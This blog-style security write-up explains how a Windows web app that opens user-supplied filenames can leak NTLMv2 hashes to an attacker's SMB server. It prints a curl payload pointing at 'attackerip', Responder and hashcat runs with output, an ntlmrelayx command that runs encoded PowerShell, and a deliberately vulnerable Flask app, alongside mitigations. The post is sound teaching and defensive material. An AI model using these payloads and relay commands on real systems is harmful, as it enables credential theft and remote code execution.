---
layout: post
title: Leaking NTLMv2 hashes from a misconfigured web server
date: 2026-01-22
---



With a poorly configured web application, an attacker can leak your server's Windows credential hash. This is a [well-documented fact for certain SSRF attack vectors](https://www.blazeinfosec.com/post/web-app-vulnerabilities-ntlm-hashes/). What's interesting is that this can also happen when the application is performing local file operations only.

This behavior, a corner-case for misconfigured Windows systems, happens when the application implicitly trusts a filename. By default, if a filename refers to an SMB path, the operating system will automatically make that SMB call. Also by default, Windows will send the hash of the principal running the web service.

The attacker need only send the location of a malicious SMB server under their control. Tools like Responder can do any number of malicious operations with it, from dumping the hash to passing it on to a legitimate SMB share which the victim can access but the attacker otherwise could not.

It doesn't quite fit into the mold of standard web application attacks. This sits in a gray area between RFI (remote file inclusion), SSRF (server-side request forgery), and more general out-of-band attacks. It can easily extend to different techniques such as T1110.002 (password cracking) and T1550.002 (passing the hash) with the use of tools like Responder and Impacket's *ntlmrelayx*.

From the application/code layer, the root cause certainly lies in input validation failures, where the application does not use a predefined allow-list of SMB servers (CWE-346), or perhaps where the developer isn't even aware that the application can even make the SMB call at all (CWE-646). In fairness, this is not intuitive behavior.

To start, let's consider a simple but realistic attack surface:

```
[attacker] -> [ windows server a: http/80 ]
```

Suppose the web server is running a simple flask service that serves a given local file based only on the filename:

```python
@app.route("/file", methods=["GET"])
def get_file():
	filename = request.args.get("name")
	
	with open(filename, "rb") as f:
		# Return the file data...
	...
```

A legitimate use case would be:

```
http://hostname.com/file?name=mydocument.txt
```

There are many ways that an application could accept a filename: POST parameters, JSON fields, or even a part of the pathname, to list some common examples.

During reconnaissance, a threat actor can access the web application might discover the file-retrieval functionality and try to abuse its behavior. Ignoring attack patterns like directory traversal, they might try the following payload to trigger an access to a non-existent share on their own system.

A payload that would trigger the vulnerability:

```
curl --path-as-is 'http://hostname.com/file?name=\\attackerip\foo'
```

Where `attackerip` is their IP address on the public or internal network, and `foo` is an intentionally arbitrary share.

This is the equivalent of running the following command on the web server:

```
dir \\attackerip\foo
```

As you can imagine, this is largely an issue with Windows systems. The same web application on a Linux host would return an error:

```python
>>> open(r"\\attackerip\foo")
Traceback (most recent call last):
  File "<python-input-4>", line 1, in <module>
    open(r"\\attackerip\foo")
    ~~~~^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '\\\\127.0.0.1\\foo'
```

On a Windows host, this command is perfectly valid, and does exactly what you'd expect.

The threat actor can run their own, malicious SMB service, such as Responder. This tool has the ability to dump and pass Windows hashes, including NTLMv2.

```
$ sudo responder -I <iface>
```

Where `iface` is the desired network interface.

If they re-run the payload, the web server responds with captured authentication credentials:

```
$ sudo responder -I <iface>
...
[+] Listening for events...                                                              

[SMB] NTLMv2-SSP Client   : 192.168.50.166
[SMB] NTLMv2-SSP Username : DESKTOP-1OA7EGF\windows
[SMB] NTLMv2-SSP Hash     : windows::DESKTOP-8OL7QGR:635f7abe0a680109:F5DA2927E85E9E...002E003100370034000000000000000000
```

You can see the hash using Wireshark on the attacker system:

```
(Windows -> Kali)
Session Startup Request, NTLMSSP_AUTH, User: DESKTOP-1OA7EGF\windows

00000337                                    f5 da 29 27 e8   ........ .....)'.
00000347  5e 9e c3 5c f2 7c 00 a3  ff 18 39 01 01 00 00 00   ^..\.|.. ..9.....=
[ redacted ]
00000497  00 36 00 38 00 2e 00 35  00 30 00 2e 00 31 00 37   .6.8...5 .0...1.7
000004A7  00 34 00 00 00 00 00 00  00 00 00 ...
```

If the password is weak, it can be trivially cracked, then used to log in to services like RDP:

```
$ hashcat -m5600 captured.ntlmv2 /usr/share/wordlists/rockyou.txt --force
    ...
    windows::DESKTOP-1OA7EGF:fe8c6850513bab93:482...:iloveyou
    ...
```

For strong passwords, which would take beyond the heat-death of the universe to crack, tools like Impacket's *ntlmrelayx* have the ability to "pass the hash" to the SMB service on behalf of the victim user. This can extend to include remote-code execution on the SMB server itself:

```
$ impacket-ntlmrelayx \
    --no-http-server \
    -smb2support \
    -t <target smb server ip> \
    -c "powershell -enc <b64encoded command...>"
```

Let's expand the attack surface to include a new server running an SMB share, which is accessible only to the web service:

```
[attacker] -> [ windows server a: http/80 ]
              [ windows server b: smb/139,445,... ]
```

We maintain the same Python code from before with the assumption that, somewhere in the stack, accesses are made from the web server to the SMB share. Aside from this assumption, the code remains identical, and so does the attack vector. The trust relationship changes nothing about the vulnerability.

Tools like `smbclient` make it easy to learn that there are no public shares available:

```
$ smbclient -L //smbsrvhostnameorip -N
session setup failed: NT_STATUS_ACCESS_DENIED
```

The threat actor can then speculate that the trust relationship exists between the SMB share and the web server. They can reuse the same payload and, again, exploit the same vulnerability in the Python code. This time, they can also employ *ntlmrelayx* to gain unauthorized access and perhaps even remote-code execution on the SMB service itself, regardless of whether or not the hash is uncrackable.

This second case is an example of an adversary-in-the-middle attack, where the threat actor's malicious SMB service (facilitated by *ntlmrelayx*) allows them to proxy requests, escalate privileges, and possibly gain remote-code execution via PowerShell:

```
Attacker -> Web Server : GET /file?name=\\attackerip\foo
Web Server -> Attacker : smb request with hash
Attacker -> SMB Server : impersonate web server principal
```

There are some key strategies to mitigate this issue.

Windows has several configuration options to prevent credentials from implicitly sending in the SMB authentication steps. In the registry, you can set the value of `RestrictSendingNTLMTraffic` to `2` in 

```html
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0
```

With this set, URNs in file-opening commands will throw the same exception we saw in the Linux test:

```
OSError: [Errno 22] Invalid argument: '\\\\attackerip\\test'
```

Next, implement validation against the normalized form of user-supplied parameters: in this case, the file path. Allow only requests whose input meets a criteria (allow-listing). Reject anything else.

Normalization is key with input validation or sanitization. For example, if the application accepts double-encoding, you'll want to validate against that form, not the initial (encoded) representation. 

```python
# Attacker sends a double-urlencoded URN, which arrives as
# `%255C%255Cattackerip%255Cfoo`
filepath_urlencoded = request.args.get("name") # `%5C%5Cattackerip%5Cfoo`
validate(filepath_urlencoded)  # Validated against the single-decoded form
filepath = urldecode(filepath_urlencoded) # Erroneously passes validation
open(filepath)  # Attack succeeds
```

A working implementation would look more like this:

```python
# Validates the normalized file path.
filepath = urldecode(request.args.get("name"))
validate(filepath)
...
```

If the automated transmission of credentials (NTLMv2 hashes) is absolutely required, also implement an allow-list of valid SMB servers which the application may use. This works in tandem with other input validation strategies, such as pathname validation. 

This could be defeated by other vulnerabilities on the network, such as ARP spoofing, but it will mitigate a threat actor's ability to make trivial SMB connections to their own, malicious service. Admins could further harden the network configuration by disabling features like `LLMNR` and `NBT-NS`.

If the application framework uses a library that does not perform automatic NTLM authentication or SMB lookups, use that instead. If feasible, block outgoing connections that are not replies to the web service.

Finally, it goes without saying, but use strong passwords.

In my local testing, I proved this with Kali Linux and a Windows 11 trial, both running as VMs on an isolated network. The behavior is native to the Windows version. I see this as concerning in an era of hobbyists running their own web services from home PCs without hardening their host machines.

If you want to try any of this yourself, set up two VMs: one running a demo version of Windows, and the other running a system such as Kali. If you want to test the relay/RCE attacks, also set up another Windows device to host an SMB server. Configure them on an internal or host-only network, and ensure the vulnerable configurations are applied. 

To set up the application:

```
python -m venv venv
.\venv\scripts\activate.ps1  # or activate.bat
(venv)
```

You can use the following boilerplate Flask app for testing with some useful debugging statements and a simplistic handling of mimetypes:

```python
from flask import Flask, request, Response
import mimetypes 


app = Flask(__name__)

@app.route("/file", methods=["GET"])
def send_file():
    filename = request.args.get("name")
    app.logger.info(f"Trying to open file: {filename}")
    content_type = None
    try:
        content_type = mimetypes.guess_type(filename)[0]
        app.logger.info(f"Using Content-Type: {filename}")
    except Exception:
        app.logger.error("Error fetching mimetype!")
        content_type = "text/html"
    try:
        with open(filename) as f:
            app.logger.info("Sending file contents...")
            return Response(f.read(), content_type=content_type)
    except PermissionError:
        app.logger.error("Error occurred :(")
        return 'Error' 
```

Run it with:

```
(venv) flask run --host <internal/host-only ip> --debug 
```

On the attacker machine, run the commands as outlined in the previous section. To inspect the network traffic, you can run Wireshark/Tshark on either system. You can also simulate any of the mitigation strategies outlined here.